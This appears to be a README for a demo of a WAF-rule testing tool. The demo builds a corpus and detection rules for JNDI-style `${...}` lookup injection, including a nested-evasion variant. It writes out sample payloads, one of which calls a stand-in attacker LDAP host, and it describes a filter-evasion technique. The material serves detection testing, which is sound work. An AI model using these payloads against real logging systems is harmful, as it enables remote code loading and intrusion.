# Demo 07 — Lookup / expression injection (the `${jndi:...}` shape)

## Situation

Some logging and templating layers expand `${...}` lookups inside strings they
process. When attacker-controlled text reaches such a layer, a lookup like
`${jndi:ldap://attacker.example/a}` can trigger a **remote resource fetch or
expression evaluation** — a serious class of injection. A naive defense just
greps for the literal string `jndi`, which attackers evade with nested lookups
like `${${env:X:-j}ndi:ldap://...}` that assemble the word at expansion time.

This demo authors a corpus for this class and proves a ruleset that catches both
the direct form **and** the nested-evasion form without flagging ordinary
`${VAR}` references.

> Scope note: this targets the generic *structural shape* only. No CVE, product,
> or version is named or required — wafproof never fetches anything; it only
> classifies local strings.

## Inputs

- `lookup-corpus.json` — malicious `${...}` lookups with dangerous schemes
  (`jndi:`, `dns:`, `script:`) plus the nested-env evasion; benign entries that
  contain `$` or braces but are not lookups (`$1,299.00`, `{firstName}`,
  `${HOME}/bin`).
- `lookup-rules.json` — two rules: one for a dangerous lookup *scheme*, one for
  *nested* `${...${...` interpolation (the evasion catch-all).

## Run it

```bash
wafproof run --rules demos/07-jndi-lookup-canary/lookup-rules.json --corpus demos/07-jndi-lookup-canary/lookup-corpus.json
```

## What to expect

A clean **100% recall, 0% false-positive rate**. The key result is the
nested-evasion entry: the scheme rule alone *misses* it (the word `jndi` is split
across an inner `${env:...}`), but the nested-interpolation rule catches it. The
benign `${HOME}/bin` shell-variable reference is left alone because it has no
dangerous scheme and no nesting.

## How to act

The lesson is that string-matching the attack *keyword* is not enough for this
class — you must also flag the *evasion structure* (nesting). Keep both rules.
The real remediation, of course, is to disable message-lookup expansion in the
logging/templating layer entirely; this ruleset is the detection backstop and
the regression test that proves it stays effective.
